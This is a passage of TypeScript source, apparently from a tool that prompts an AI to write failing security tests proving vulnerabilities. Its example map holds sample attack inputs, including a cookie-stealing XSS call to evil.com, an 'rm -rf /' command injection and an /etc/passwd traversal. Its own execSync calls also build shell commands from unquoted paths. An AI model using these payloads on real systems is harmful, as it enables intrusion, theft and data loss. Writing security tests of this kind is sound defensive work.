5. Follows ${framework.name} conventions`;

    if (previousAttempts.length > 0) {
      prompt += `\n\nPREVIOUS ATTEMPTS (learn from these errors):`;
      for (const attempt of previousAttempts) {
        prompt += `\n- Attempt ${attempt.attempt}: ${attempt.error} - ${attempt.errorMessage}`;
      }

      // Add specific guidance based on error types
      const lastError = previousAttempts[previousAttempts.length - 1].error;
      if (lastError === 'SyntaxError') {
        prompt += `\n\nIMPORTANT: Fix the syntax error. Ensure valid ${framework.name} syntax.`;
      } else if (lastError === 'TestPassedUnexpectedly') {
        prompt += `\n\nIMPORTANT: Make the test MORE AGGRESSIVE. It must FAIL on vulnerable code.`;
      } else if (lastError === 'ExistingTestsRegression') {
        prompt += `\n\nIMPORTANT: Don't break existing tests. Avoid modifying shared state or setup blocks.`;
      }
    }

    return prompt;
  }

  /**
   * Get realistic vulnerability examples from Phase 0 documentation
   */
  private getRealisticVulnerabilityExample(vulnerabilityType: string): string {
    // Map to examples from REALISTIC-VULNERABILITY-EXAMPLES.md
    const examples: Record<string, string> = {
      'sql_injection': `REAL-WORLD EXAMPLE (RailsGoat):
Pattern: User.where("id = '\#{params[:user][:id]}'")
Attack: 5') OR admin = 't' --'
Impact: Privilege escalation to admin
CWE: CWE-89`,

      'nosql_injection': `REAL-WORLD EXAMPLE (NodeGoat):
Pattern: db.accounts.find({username: username, password: password})
Attack: {"username": "admin", "password": {"$gt": ""}}
Impact: Authentication bypass
CWE: CWE-943`,

      'xss': `REAL-WORLD EXAMPLE (NodeGoat):
Pattern: res.send(\`<h1>Profile: \${user.name}</h1>\`)
Attack: <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
Impact: Session hijacking
CWE: CWE-79`,

      'command_injection': `REAL-WORLD EXAMPLE:
Pattern: exec(\`tar -czf backup.tar.gz \${filename}\`)
Attack: data.txt; rm -rf / #
Impact: System compromise
CWE: CWE-78`,

      'path_traversal': `REAL-WORLD EXAMPLE:
Pattern: res.sendFile(\`/app/uploads/\${filename}\`)
Attack: ../../../etc/passwd
Impact: Read sensitive files
CWE: CWE-22`
    };

    return examples[vulnerabilityType.toLowerCase()] || `Vulnerability type: ${vulnerabilityType}`;
  }

  /**
   * Detect framework from test file path
   */
  private detectFrameworkFromPath(testPath: string): TestFramework {
    const fileName = path.basename(testPath);
    const ext = path.extname(testPath);

    // Detect by file naming conventions
    if (fileName.includes('.spec.')) {
      if (ext === '.rb') return { name: 'rspec', syntaxCheckCommand: 'ruby -c', testCommand: 'bundle exec rspec' };
      if (ext === '.ts' || ext === '.js') return { name: 'jest', syntaxCheckCommand: 'node --check', testCommand: 'npm test' };
    }

    if (fileName.includes('.test.')) {
      if (ext === '.ts' || ext === '.js') return { name: 'vitest', syntaxCheckCommand: 'node --check', testCommand: 'npm test' };
      if (ext === '.php') return { name: 'phpunit', syntaxCheckCommand: 'php -l', testCommand: 'vendor/bin/phpunit' };
    }

    if (ext === '.py') return { name: 'pytest', syntaxCheckCommand: 'python -m py_compile', testCommand: 'pytest' };
    if (ext === '.rb') return { name: 'rspec', syntaxCheckCommand: 'ruby -c', testCommand: 'bundle exec rspec' };
    if (ext === '.java') return { name: 'junit5', syntaxCheckCommand: 'javac', testCommand: 'mvn test' };
    if (ext === '.ex' || ext === '.exs') return { name: 'exunit', syntaxCheckCommand: 'elixir -c', testCommand: 'mix test' };

    // Default to generic
    return { name: 'generic', syntaxCheckCommand: 'echo "No syntax check"', testCommand: 'echo "No test runner"' };
  }

  /**
   * Get file extension for language
   */
  private getLanguageExtension(frameworkName: string): string {
    const extensions: Record<string, string> = {
      'rspec': '.rb',
      'minitest': '.rb',
      'pytest': '.py',
      'phpunit': '.php',
      'pest': '.php',
      'jest': '.js',
      'vitest': '.ts',
      'mocha': '.js',
      'junit5': '.java',
      'testng': '.java',
      'exunit': '.exs'
    };

    return extensions[frameworkName.toLowerCase()] || '.js';
  }

  /**
   * Validate syntax of test file
   */
  private async validateSyntax(testFile: string, framework: TestFramework): Promise<void> {
    if (!framework.syntaxCheckCommand) {
      logger.debug('No syntax check command available');
      return;
    }

    try {
      const command = `${framework.syntaxCheckCommand} ${testFile}`;
      execSync(command, { cwd: this.repoPath, encoding: 'utf8' });
    } catch (error: any) {
      throw new Error(`Syntax validation failed: ${error.message}`);
    }
  }

  /**
   * Run test and check results
   */
  private async runTest(testFile: string, framework: TestFramework): Promise<{
    passed: boolean;
    existingTestsFailed: boolean;
    failedTests?: string[];
  }> {
    if (!framework.testCommand) {
      logger.warn('No test command available, skipping test execution');
      return { passed: false, existingTestsFailed: false };
    }

    try {
      const command = `${framework.testCommand} ${testFile}`;
      const output = execSync(command, { cwd: this.repoPath, encoding: 'utf8' });

      // Parse output to determine if test passed
      // This is a simplified check - real implementation would parse framework-specific output
      const passed = output.includes('0 failures') || output.includes('All tests passed');

      return {
        passed,
        existingTestsFailed: false
      };
    } catch (error: any) {
      // Test failed (which is good for RED tests!)
      // Check if it's just the new test or if existing tests also failed
      const output = error.stdout || error.message || '';

      // Simple heuristic: if output mentions multiple failures, check if existing tests failed
      const failureCount = (output.match(/failed/gi) || []).length;
      const existingTestsFailed = failureCount > 1;

      return {
        passed: false,
        existingTestsFailed,
        failedTests: existingTestsFailed ? this.extractFailedTestNames(output) : undefined
      };
    }
  }

  /**
   * Extract failed test names from test output
   */
  private extractFailedTestNames(output: string): string[] {
    const failedTests: string[] = [];

    // Common patterns for failed test output
    const patterns = [
      /FAIL\s+(.+)/g,
      /✗\s+(.+)/g,
      /Failed:\s+(.+)/g,
      /\d+\)\s+(.+)/g
    ];

    for (const pattern of patterns) {
      const matches = output.matchAll(pattern);
      for (const match of matches) {
        if (match[1]) {
          failedTests.push(match[1].trim());
        }
      }
    }

    return failedTests.slice(0, 5); // Return first 5 for brevity
  }

  /**
   * Tag issue as "not-validated" after retry exhaustion
   */
  private async tagIssueNotValidated(
    vulnerability: Vulnerability,
    previousAttempts: AttemptHistory[]
  ): Promise<void> {
    // This would need an issue number, which we don't have in the current flow
    // For now, log the failure
    logger.error(`Failed to validate vulnerability after ${previousAttempts.length} attempts`);
    logger.error(`Vulnerability: ${vulnerability.type} at ${vulnerability.location}`);
    logger.error(`Attempt history:`);
    for (const attempt of previousAttempts) {
      logger.error(`  - Attempt ${attempt.attempt}: ${attempt.error} - ${attempt.errorMessage}`);
    }

    // In a real implementation, this would:
    // 1. Find or create a GitHub issue for this vulnerability
    // 2. Add "not-validated" label
    // 3. Add comment with attempt history
  }

  /**
   * Scan repository for test files
   */
  private async scanTestFiles(framework?: string): Promise<string[]> {
    const testFiles: string[] = [];
    const patterns = [
      '**/*.spec.ts',
      '**/*.spec.js',
      '**/*.test.ts',
      '**/*.test.js',
      '**/*_spec.rb',
      '**/*_test.py',
      '**/*Test.java',
      '**/*_test.exs'
    ];

    for (const pattern of patterns) {
      try {
        const matches = execSync(`find ${this.repoPath} -name "${pattern.replace('**/', '')}" -type f`, {
          encoding: 'utf8',
          maxBuffer: 10 * 1024 * 1024 // 10MB
        }).trim().split('\n').filter(Boolean);

        testFiles.push(...matches);
      } catch (error) {
        // Pattern not found, continue
      }
    }

    return testFiles;
  }
}